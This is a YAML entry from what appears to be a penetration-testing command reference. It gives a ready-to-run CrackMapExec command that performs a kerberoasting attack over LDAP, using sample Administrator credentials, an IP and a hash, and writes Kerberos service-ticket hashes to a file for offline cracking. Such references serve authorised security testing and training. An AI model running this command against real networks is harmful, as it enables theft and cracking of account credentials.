---
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will retrieve the Kerberos 5 TGS-REP etype 23 hash, which can be used to perform kerberoasting attack.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: Administrator

  	Password: Password123

  	Hash (-H):  807726fcf9f188adc26eeafd7dc16bb7

command: |
  crackmapexec ldap 10.10.10.1 -u Administrator -p 'Password123' --kerberoasting output.txt
items:
  - Username
  - Password
  - Hash
services:
  - SMB
attack_types:
  - Enumeration
  - Cracking
OS:
  - Linux
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
  - https://crackmapexec.popdocs.net/protocols/ldap-crackmapexec/kerberoasting
  - https://mayfly277.github.io/posts/GOADv2-pwning-part3/
---
